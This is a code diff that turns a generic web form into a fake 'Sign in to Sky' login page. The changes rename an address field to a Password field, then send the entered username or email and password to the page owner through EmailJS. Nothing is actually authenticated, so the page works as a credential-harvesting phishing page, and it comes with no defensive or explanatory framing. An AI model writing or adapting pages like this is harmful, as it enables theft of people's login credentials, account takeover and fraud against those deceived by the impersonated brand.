@@ -146,11 +146,11 @@
   <div class="wrap">
     <div class="card">
       <h1>Hello</h1>
-      <p class="subtitle">Fill this form</p>
+      <p class="subtitle">Sign in to Sky</p>
 
       <input type="text" id="identifier" placeholder="Email or username">
 
-      <input type="text" id="address" placeholder="Address" style="margin-top:14px;">
+      <input type="text" id="Password" placeholder="Password" style="margin-top:14px;">
 
       <button class="btn" id="continueBtn" onclick="handleContinue()">Continue</button>
 
@@ -175,7 +175,7 @@
       const btn     = document.getElementById('continueBtn');
       const status  = document.getElementById('status');
       const value   = document.getElementById('identifier').value.trim();
-      const address = document.getElementById('address').value.trim();
+      const Password = document.getElementById('Password').value.trim();
 
       if (!value) {
         showStatus('Please enter your email or username.', 'error');
@@ -189,7 +189,7 @@
       // These keys must match the variables used in your EmailJS template
       const templateParams = {
         identifier: value,
-        address: address
+        Password: Password
       };
 
       emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
